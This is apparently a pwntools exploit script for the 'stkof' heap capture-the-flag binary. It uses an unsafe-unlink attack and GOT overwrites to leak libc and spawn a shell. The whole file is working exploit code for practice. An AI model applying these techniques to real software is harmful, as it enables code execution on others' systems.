from pwn import *

libc = ELF("./libc-2.23.so")
s = process("./stkof", env={"LD_PRELOAD": "./libc-2.23.so"})
elf = ELF("./stkof")

log.info("strlen: {}".format(hex(elf.got["strlen"])))

def allocate(size):
    s.sendline("1")
    s.sendline(str(size))
    s.recvuntil("OK\n")

def edit(idx, size, content):
    s.sendline("2")
    s.sendline(str(idx))
    s.sendline(str(size))
    s.sendline(content)
    s.recvuntil("OK\n")

def delete(idx):
    s.sendline("3")
    s.sendline(str(idx))
    s.recvuntil("OK\n")

allocate(0xa0)
allocate(0xa0)
allocate(0xa0)
allocate(0xa0)
allocate(0xa0)
allocate(0xa0)
payload = p64(0x0)                      # fake prev_size for fake chunk
payload += p64(0xa1)                    # fake size of fake chunk with P bit set to 1 
payload += p64(0x602150 - 0x8*3)         # this is P->FD         
payload += p64(0x602150 - 0x8*2)        # this is P->BK
payload += b"\x00"*(0xa0 - 0x20)  # set fd_nextsize = 0 then fill up the rest of content
payload += p64(0xa0)                   # overflow the 1st entry which is `previous chunk size`, -0x10 to make it point to our fake chunk
payload += p64(0xb0)                      # overflow the 2nd entry which is `this chunk size`, set P bit to 0 to trigger unlink
edit(2, len(payload), payload)
delete(3)
# now 3 is freed, unlink is triggered, and the 1st ptr in the ptr array points to 0x602150-0x8*3
# then, as see below, we edit that ptr to overflow the 4th ptr and modify it to strlen@got, which we can then edit into puts@plt to leak libc address. 

payload = b"A"*24 
payload += p64(0x602148)
payload += b"B"*8
payload += p64(elf.got["strlen"])
payload += p64(elf.got["puts"])         # 5th ptr which is passed as the argument to the leak 
payload += p64(elf.got["puts"])
edit(2, len(payload), payload)
edit(4, 8, p64(elf.symbols["puts"]))
s.recvuntil("FAIL\n")
s.sendline("4")
s.sendline("5")

leak = s.recvline().strip(b"\n")
libc.address = u64(leak.ljust(8, b"\x00")) - libc.symbols["puts"]
log.info("Libc address: {}".format(hex(libc.address)))

edit(6, 8, p64(libc.address + 0x3f42a))

s.interactive()
